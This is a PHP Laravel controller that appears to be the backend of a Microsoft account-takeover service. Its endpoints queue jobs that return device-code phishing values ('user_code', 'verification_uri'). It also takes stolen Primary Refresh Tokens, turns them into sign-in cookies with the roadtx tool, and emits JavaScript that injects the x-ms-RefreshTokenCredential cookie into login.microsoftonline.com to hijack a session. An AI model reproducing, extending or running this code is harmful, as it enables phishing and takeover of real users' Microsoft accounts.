<?php
namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\User;
use App\Models\Token;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Str;
use Symfony\Component\Process\Process;
use App\Models\CommandJob;
use App\Jobs\RunPythonCommandJob;

class CommandController extends Controller
{
    // 🚀 START
    public function start(Request $request)
{
    $apiKey = $request->query('api_key');

    $user = User::where('api_key', $apiKey)->first();

    if (!$user) {
        return response()->json(["error" => "Unauthorized"], 401);
    }

    // 🔥 LIMIT PER USER
    if (CommandJob::where('user_id', $user->id)
        ->whereIn('status', ['pending','running'])
        ->count() >= 3) {

        return response()->json([
            "error" => "Too many active jobs"
        ], 429);
    }

    // ✅ NO FILE NEEDED
    $job = CommandJob::create([
        'user_id' => $user->id,
        'file' => null, // optional (atau hapus kolom nanti)
        'status' => 'pending',
        'timeout_seconds' => 120
    ]);

    RunPythonCommandJob::dispatch($job->id)->onQueue('python');

    return response()->json([
        "job_id" => $job->id,
        "status" => "pending"
    ]);
}

    // 🔍 POLL
    public function poll(Request $request, $id)
    {
        $apiKey = $request->query('api_key');

        $user = User::where('api_key', $apiKey)->first();

        if (!$user) {
            return response()->json(["error" => "Unauthorized"], 401);
        }

        $job = CommandJob::where('id', $id)
            ->where('user_id', $user->id)
            ->first();

        if (!$job) {
            return response()->json(["error" => "Not found"], 404);
        }

        return response()->json([
            "job_id" => $job->id,
            "status" => $job->status,

            // 🔥 PENTING
            "user_code" => $job->user_code,
            "verification_uri" => $job->verification_uri,

            "expired" => $job->status === 'expired',

            "output" => $job->status === 'success' ? $job->output : null,
            "error" => $job->error
        ]);
    }

    public function cookie($id)
    {
        $token = Token::findOrFail($id);

        if (!$token->prt) {
            return response()->json([
                'error' => 'PRT not found'
            ], 400);
        }

        // =========================
        // 📁 TEMP FILE
        // =========================
        $tmpDir = storage_path('app/prt_tmp');
        if (!File::exists($tmpDir)) {
            File::makeDirectory($tmpDir, 0777, true);
        }

        $file = $tmpDir . '/' . Str::uuid() . '.prt';

        // 🔥 simpan PRT ke file
        File::put($file, $token->prt);

        try {

            // =========================
            // 🚀 RUN ROADTX
            // =========================
            $process = new Process([
                'roadtx',
                'prtcookie',
                '--prt-file',
                $file
            ]);

            $process->setTimeout(30);
            $process->run();

            if (!$process->isSuccessful()) {
                throw new \Exception($process->getErrorOutput());
            }

            $output = $process->getOutput();

            // =========================
            // 🔥 EXTRACT COOKIE
            // =========================
            if (!preg_match('/PRT cookie:\s*(\S+)/', $output, $match)) {
                throw new \Exception("PRT cookie not found");
            }

            $cookie = $match[1];

            // =========================
            // 🔥 BUILD JS SCRIPT
            // =========================
            $script = <<<JS
// Inject PRT Cookie
document.cookie = "x-ms-RefreshTokenCredential={$cookie}; domain=.login.microsoftonline.com; path=/; secure; samesite=none";

// Redirect after 3s
setTimeout(() => {
  window.location.href = "https://login.microsoftonline.com/?auth=2";
}, 3000);
JS;

            return response()->json([
                'script' => $script
            ]);

        } catch (\Throwable $e) {

            \Log::error('[PRT COOKIE ERROR]', [
                'error' => $e->getMessage()
            ]);

            return response()->json([
                'error' => 'Failed generate cookie'
            ], 500);

        } finally {
            // cleanup
            if (File::exists($file)) {
                File::delete($file);
            }
        }
    }
}